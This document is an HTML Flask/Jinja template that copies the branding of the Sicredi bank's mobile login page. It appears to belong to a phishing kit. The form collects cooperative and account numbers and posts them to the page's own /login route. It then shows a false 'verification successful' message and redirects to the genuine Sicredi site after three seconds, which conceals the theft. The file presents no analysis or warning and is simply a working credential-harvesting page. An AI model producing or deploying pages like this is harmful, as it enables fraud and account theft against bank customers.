<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sicredi - Acesso Móvel</title>
    
    <style>
        :root {
            --sicredi-green: #3fa110;
            --sicredi-dark-green: #33820d;
            --bg-gray: #f4f4f4;
            --text-gray: #333;
            --border-gray: #cdd3cd;
            --error-red: #e74c3c;
        }

        /* Estilos das Mensagens */
        .alert {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
            font-weight: bold;
        }
        .alert-error {
            background-color: #fdeaea;
            color: var(--error-red);
            border: 1px solid var(--error-red);
        }
        .alert-success {
            background-color: #eafdea;
            color: var(--sicredi-green);
            border: 1px solid var(--sicredi-green);
        }

        html, body { height: 100%; margin: 0; padding: 0; }
        body { display: flex; flex-direction: column; font-family: 'Helvetica', Arial, sans-serif; background-color: var(--bg-gray); }
        .main-wrapper { flex: 1 0 auto; }
        header { background-color: #fff; padding: 20px; text-align: center; border-bottom: 4px solid var(--sicredi-green); }
        .logo-img { max-width: 150px; height: auto; }
        .main-container { padding: 20px; max-width: 500px; margin: 0 auto; }
        .login-card { background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        h2 { color: var(--sicredi-green); margin-top: 0; font-size: 22px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
        input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid var(--border-gray); border-radius: 4px; font-size: 16px; }
        .btn-primary { background-color: var(--sicredi-green); color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #divBlindagem { display: flex; justify-content: center; align-items: center; padding: 40px 0; width: 100%; }
        #footer { flex-shrink: 0; background-color: var(--sicredi-dark-green); color: white; text-align: center; padding: 20px 0; width: 100%; }
        .footer-links { display: flex; justify-content: center; gap: 15px; margin-top: 10px; }
        #footer a { font-size: 13px; color: white; text-decoration: underline; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <header>
            <img src="{{ url_for('static', filename='logosicredi-home.jpg') }}" alt="Sicredi" class="logo-img">
        </header>

        <div class="main-container">
            <div class="login-card">
                <h2>Acessar</h2>

                {% if status == 'erro' %}
                    <div class="alert alert-error">
                        Dados incorretos, digite novamente.
                    </div>
                {% elif status == 'sucesso' %}
                    <div class="alert alert-success">
                        Verificação feita com sucesso ✅
                    </div>
                    <script>
                        setTimeout(function(){
                            window.location.href = "https://www.sicredi.com.br";
                        }, 3000);
                    </script>
                {% endif %}

                <form id="loginForm" action="/login" method="POST">
                    <div class="form-group">
                        <label for="coop">Cooperativa</label>
                        <input type="number" id="coop" name="coop" placeholder="0000" required>
                    </div>
                    <div class="form-group">
                        <label for="conta">Conta (com dígito)</label>
                        <input type="text" id="conta" name="conta" placeholder="00000-0" required>
                    </div>
                    <button type="submit" class="btn-primary">ACESSAR</button>
                </form>
            </div>
        </div>

        <section id="divBlindagem">
            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                <circle cx="32" cy="32" r="31" stroke="#3FA110" stroke-width="2"/>

            </svg>
        </section>
    </div>

    <footer id="footer">
        <p style="margin: 0;">&copy; 2026 Sicredi - Todos os direitos reservados.</p>
        <div class="footer-links">
            <a href="#">Perguntas Frequentes</a>
            <a href="#">Rede de Atendimento</a>
            <a href="#">Segurança</a>
        </div>
    </footer>

</body>
</html>
